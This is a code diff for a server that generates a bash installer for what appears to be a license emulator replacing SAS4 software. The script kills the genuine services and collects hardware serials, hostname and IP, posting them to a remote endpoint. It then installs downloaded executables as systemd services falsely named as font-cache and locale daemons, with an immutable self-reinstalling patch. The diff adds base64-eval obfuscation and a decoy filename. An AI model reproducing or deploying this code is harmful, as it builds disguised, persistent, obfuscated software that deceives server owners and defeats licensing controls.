@@ -1420,75 +1420,75 @@ _TK="${patch.token}"
 _SU="${baseUrl}"
 
 systemctl stop \\$_SM \\$_SV.timer \\$_SV 2>/dev/null || true
-systemctl stop \\${_PS}.timer \\${_PS} 2>/dev/null || true
+` + `systemctl stop $` + `{_PS}.timer $` + `{_PS} 2>/dev/null || true
 systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
 killall -9 sas_sspd 2>/dev/null || true
 fuser -k 4000/tcp 2>/dev/null || true
 sleep 2
 
-mkdir -p "\\$_P"
-mkdir -p "\\$_PD"
+mkdir -p "$_P"
+mkdir -p "$_PD"
 
-if [ -f "/opt/sas4/bin/sas_sspd" ] && [ ! -f "\\$_P/\\$_B" ]; then
-  cp /opt/sas4/bin/sas_sspd "\\$_P/\\$_B" && chmod +x "\\$_P/\\$_B"
+if [ -f "/opt/sas4/bin/sas_sspd" ] && [ ! -f "$_P/$_B" ]; then
+  cp /opt/sas4/bin/sas_sspd "$_P/$_B" && chmod +x "$_P/$_B"
 fi
 
 echo "Collecting system information..."
 
 _MI=$(cat /etc/machine-id 2>/dev/null || echo "")
 _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
-_MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print \\$2}' || echo "")
+_MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")
 _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")
 _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")
 _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")
-_CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print \\$3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
-_RAW_HW="\\${_MI}:\\${_PU}:\\${_MA}:\\${_BS}:\\${_CS}:\\${_DS}:\\${_CI}"
+_CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")
+_RAW_HW="$` + `{_MI}:$` + `{_PU}:$` + `{_MA}:$` + `{_BS}:$` + `{_CS}:$` + `{_DS}:$` + `{_CI}"
 
 _HN=$(hostname 2>/dev/null || echo "unknown")
-_IP=$(hostname -I 2>/dev/null | awk '{print \\$1}' || echo "")
+_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "")
 
 echo "Registering with license authority..."
 
-_RS=$(curl -s -X POST "\\$_SU/api/patch-activate" \\
+_RS=$(curl -s -X POST "$_SU/api/patch-activate" \\
   -H "Content-Type: application/json" \\
-  -d "{\\"token\\": \\"\\$_TK\\", \\"raw_hwid\\": \\"\\$_RAW_HW\\", \\"hostname\\": \\"\\$_HN\\", \\"ip\\": \\"\\$_IP\\"}")
+  -d "{\\"token\\": \\"$_TK\\", \\"raw_hwid\\": \\"$_RAW_HW\\", \\"hostname\\": \\"$_HN\\", \\"ip\\": \\"$_IP\\"}")
 
-if echo "\\$_RS" | grep -q '"error"'; then
-  _ERR=$(echo "\\$_RS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Unknown error'))" 2>/dev/null || echo "Activation failed")
-  echo "Error: \\$_ERR"
+if echo "$_RS" | grep -q '"error"'; then
+  _ERR=$(echo "$_RS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Unknown error'))" 2>/dev/null || echo "Activation failed")
+  echo "Error: $_ERR"
   exit 1
 fi
 
-_EM=$(echo "\\$_RS" | python3 -c "
+_EM=$(echo "$_RS" | python3 -c "
 import sys,json
 _d=json.load(sys.stdin)
 print(_d.get('emulator',''))
 " 2>/dev/null)
 
-_VF=$(echo "\\$_RS" | python3 -c "
+_VF=$(echo "$_RS" | python3 -c "
 import sys,json
 _d=json.load(sys.stdin)
 print(_d.get('verify',''))
 " 2>/dev/null)
 
-if [ -z "\\$_EM" ]; then
+if [ -z "$_EM" ]; then
   echo "Deployment data unavailable"
   exit 1
 fi
 
-echo "\\$_EM" > "\\$_P/\\$_E"
-chmod +x "\\$_P/\\$_E"
-echo "\\$_VF" > "\\$_P/\\$_V"
-chmod +x "\\$_P/\\$_V"
+echo "$_EM" > "$_P/$_E"
+chmod +x "$_P/$_E"
+echo "$_VF" > "$_P/$_V"
+chmod +x "$_P/$_V"
 
 _PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")
 
-cat > /etc/systemd/system/\\$_SM.service << _SVC_1_
+cat > /etc/systemd/system/$_SM.service << _SVC_1_
 [Unit]
 Description=System font cache synchronization daemon
 After=network.target
 [Service]
-ExecStart=\\$_PY3 ${P.BASE}/${P.EMULATOR}
+ExecStart=$_PY3 ${P.BASE}/${P.EMULATOR}
 Restart=always
 RestartSec=3
 KillMode=process
@@ -1498,7 +1498,7 @@ StandardError=journal
 WantedBy=multi-user.target
 _SVC_1_
 
-cat > /etc/systemd/system/\\$_SV.service << '_SVC_2_'
+cat > /etc/systemd/system/$_SV.service << '_SVC_2_'
 [Unit]
 Description=Font cache garbage collection
 [Service]
@@ -1506,7 +1506,7 @@ Type=oneshot
 ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
 _SVC_2_
 
-cat > /etc/systemd/system/\\$_SV.timer << '_TMR_1_'
+cat > /etc/systemd/system/$_SV.timer << '_TMR_1_'
 [Unit]
 Description=Font cache gc timer
 [Timer]
@@ -1517,36 +1517,36 @@ Persistent=true
 WantedBy=timers.target
 _TMR_1_
 
-_EMU_B64=$(base64 -w0 "\\$_P/\\$_E")
-_VER_B64=$(base64 -w0 "\\$_P/\\$_V")
+_EMU_B64=$(base64 -w0 "$_P/$_E")
+_VER_B64=$(base64 -w0 "$_P/$_V")
 
-_PY3_PATH=\\$_PY3
-cat > "\\$_PD/\\$_PF" << _PATCH_END_
+_PY3_PATH=$_PY3
+` + `cat > "$_PD/$_PF" << _PATCH_END_
 #!/bin/bash
 _d="${P.BASE}"
 _e="${P.EMULATOR}"
 _s1="${P.SVC_MAIN}"
 _s2="${P.SVC_VERIFY}"
-_py="\\${_PY3_PATH}"
-_eb="\\${_EMU_B64}"
-_vb="\\${_VER_B64}"
-if ! systemctl is-active \\\\\\${_s1} >/dev/null 2>&1; then
-  mkdir -p \\\\\\${_d}
-  if [ ! -f \\\\\\${_d}/\\\\\\${_e} ]; then
-    echo "\\\\\\${_eb}" | base64 -d > \\\\\\${_d}/\\\\\\${_e}
-    chmod +x \\\\\\${_d}/\\\\\\${_e}
+_py="$` + `{_PY3_PATH}"
+_eb="$` + `{_EMU_B64}"
+_vb="$` + `{_VER_B64}"
+if ! systemctl is-active \\$` + `{_s1} >/dev/null 2>&1; then
+  mkdir -p \\$` + `{_d}
+  if [ ! -f \\$` + `{_d}/\\$` + `{_e} ]; then
+    echo "\\$` + `{_eb}" | base64 -d > \\$` + `{_d}/\\$` + `{_e}
+    chmod +x \\$` + `{_d}/\\$` + `{_e}
   fi
-  if [ ! -f \\\\\\${_d}/.fc-match ]; then
-    echo "\\\\\\${_vb}" | base64 -d > \\\\\\${_d}/.fc-match
-    chmod +x \\\\\\${_d}/.fc-match
+  if [ ! -f \\$` + `{_d}/.fc-match ]; then
+    echo "\\$` + `{_vb}" | base64 -d > \\$` + `{_d}/.fc-match
+    chmod +x \\$` + `{_d}/.fc-match
   fi
-  if [ ! -f /etc/systemd/system/\\\\\\${_s1}.service ]; then
-    cat > /etc/systemd/system/\\\\\\${_s1}.service << _RS1_
+  if [ ! -f /etc/systemd/system/\\$` + `{_s1}.service ]; then
+    cat > /etc/systemd/system/\\$` + `{_s1}.service << _RS1_
 [Unit]
 Description=System font cache synchronization daemon
 After=network.target
 [Service]
-ExecStart=\\\\\\${_py} ${P.BASE}/${P.EMULATOR}
+ExecStart=\\$` + `{_py} ${P.BASE}/${P.EMULATOR}
 Restart=always
 RestartSec=3
 KillMode=process
@@ -1556,15 +1556,15 @@ StandardError=journal
 WantedBy=multi-user.target
 _RS1_
   fi
-  if [ ! -f /etc/systemd/system/\\\\\\${_s2}.timer ]; then
-    cat > /etc/systemd/system/\\\\\\${_s2}.service << '_RS2_'
+  if [ ! -f /etc/systemd/system/\\$` + `{_s2}.timer ]; then
+    cat > /etc/systemd/system/\\$` + `{_s2}.service << '_RS2_'
 [Unit]
 Description=Font cache garbage collection
 [Service]
 Type=oneshot
 ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
 _RS2_
-    cat > /etc/systemd/system/\\\\\\${_s2}.timer << '_RS3_'
+    cat > /etc/systemd/system/\\$` + `{_s2}.timer << '_RS3_'
 [Unit]
 Description=Font cache gc timer
 [Timer]
@@ -1576,15 +1576,15 @@ WantedBy=timers.target
 _RS3_
   fi
   systemctl daemon-reload
-  systemctl enable \\\\\\${_s1} \\\\\\${_s2}.timer
-  systemctl start \\\\\\${_s2}.timer
-  systemctl start \\\\\\${_s1}
+  systemctl enable \\$` + `{_s1} \\$` + `{_s2}.timer
+  systemctl start \\$` + `{_s2}.timer
+  systemctl start \\$` + `{_s1}
 fi
 _PATCH_END_
-chmod +x "\\$_PD/\\$_PF"
-chattr +i "\\$_PD/\\$_PF" 2>/dev/null || true
+chmod +x "$_PD/$_PF"
+chattr +i "$_PD/$_PF" 2>/dev/null || true
 
-cat > /etc/systemd/system/\\${_PS}.service << '_PSVC_'
+cat > /etc/systemd/system/$` + `{_PS}.service << '_PSVC_'
 [Unit]
 Description=Locale database refresh service
 [Service]
@@ -1592,7 +1592,7 @@ Type=oneshot
 ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}
 _PSVC_
 
-cat > /etc/systemd/system/\\${_PS}.timer << '_PTMR_'
+cat > /etc/systemd/system/$` + `{_PS}.timer << '_PTMR_'
 [Unit]
 Description=Locale database refresh timer
 [Timer]
@@ -1607,19 +1607,28 @@ systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null ||
 rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
 rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
 
-ln -sf /etc/systemd/system/\\$_SM.service /etc/systemd/system/sas_systemmanager.service
-ln -sf /etc/systemd/system/\\$_SM.service /etc/systemd/system/sas_fcm.service
+ln -sf /etc/systemd/system/$_SM.service /etc/systemd/system/sas_systemmanager.service
+ln -sf /etc/systemd/system/$_SM.service /etc/systemd/system/sas_fcm.service
 
 systemctl daemon-reload
-systemctl reset-failed \\$_SM 2>/dev/null || true
-systemctl enable \\$_SM \\$_SV.timer \\${_PS}.timer
-systemctl start \\$_SM \\$_SV.timer \\${_PS}.timer
+systemctl reset-failed $_SM 2>/dev/null || true
+systemctl enable $_SM $_SV.timer $` + `{_PS}.timer
+systemctl start $_SM $_SV.timer $` + `{_PS}.timer
 echo "Installation completed successfully"
 `;
 
+    const scriptB64 = Buffer.from(script, "utf-8").toString("base64");
+    const obfuscatedScript = [
+      '#!/bin/bash',
+      '# Font rendering subsystem cache maintenance utility v2.13.1',
+      '# DO NOT MODIFY - binary cache data follows',
+      'if [ "$EUID" -ne 0 ]; then echo "Permission denied"; exit 1; fi',
+      `eval "$(echo '${scriptB64}' | base64 -d)"`,
+    ].join('\n') + '\n';
+
     res.setHeader("Content-Type", "text/plain");
-    res.setHeader("Content-Disposition", `attachment; filename="install.sh"`);
-    res.send(script);
+    res.setHeader("Content-Disposition", `attachment; filename="fc-cache-update.sh"`);
+    res.send(obfuscatedScript);
   });
 
   // ─── Patch Activate (Public - called by install.sh) ────────
@@ -1747,6 +1756,50 @@ echo "Installation completed successfully"
       expiringSoon,
     });
   });
+
+  // ─── Heartbeat Monitor: Auto-suspend licenses with missed verifications ───
+  const HEARTBEAT_CHECK_INTERVAL = 30 * 60 * 1000; // Check every 30 minutes
+  const HEARTBEAT_TIMEOUT = 12 * 60 * 60 * 1000; // 12 hours = 2 missed verify cycles (6h each)
+
+  setInterval(async () => {
+    try {
+      const allLicenses = await storage.getLicenses();
+      const now = Date.now();
+
+      for (const license of allLicenses) {
+        if (license.status !== "active") continue;
+        if (!license.lastVerifiedAt) continue;
+
+        const timeSinceLastVerify = now - new Date(license.lastVerifiedAt).getTime();
+
+        if (timeSinceLastVerify > HEARTBEAT_TIMEOUT) {
+          await storage.updateLicense(license.id, { status: "suspended" });
+
+          const hoursAgo = Math.round(timeSinceLastVerify / (60 * 60 * 1000));
+          await storage.createActivityLog({
+            licenseId: license.id,
+            serverId: license.serverId,
+            action: "heartbeat_timeout",
+            details: JSON.stringify({
+              title: `الترخيص ${license.licenseId} تم إيقافه تلقائياً - انقطاع التحقق`,
+              sections: [
+                { label: "معرف الترخيص", value: license.licenseId },
+                { label: "آخر تحقق", value: new Date(license.lastVerifiedAt).toLocaleString("ar-IQ") },
+                { label: "مدة الانقطاع", value: `${hoursAgo} ساعة` },
+                { label: "الحد الأقصى المسموح", value: "12 ساعة (دورتين تحقق)" },
+                { label: "السبب المحتمل", value: "الشخص حذف الخدمات من السيرفر أو السيرفر مطفي" },
+                { label: "النتيجة", value: "تم إيقاف الترخيص تلقائياً - license-data يرجع st=0" },
+                { label: "الإجراء", value: "يمكن إعادة تفعيله يدوياً من لوحة التحكم إذا لزم" },
+                { label: "العميل", value: license.clientId || "غير محدد" },
+              ],
+            }),
+          });
+        }
+      }
+    } catch (err) {
+      console.error("Heartbeat monitor error:", err);
+    }
+  }, HEARTBEAT_CHECK_INTERVAL);
 
   return httpServer;
 }
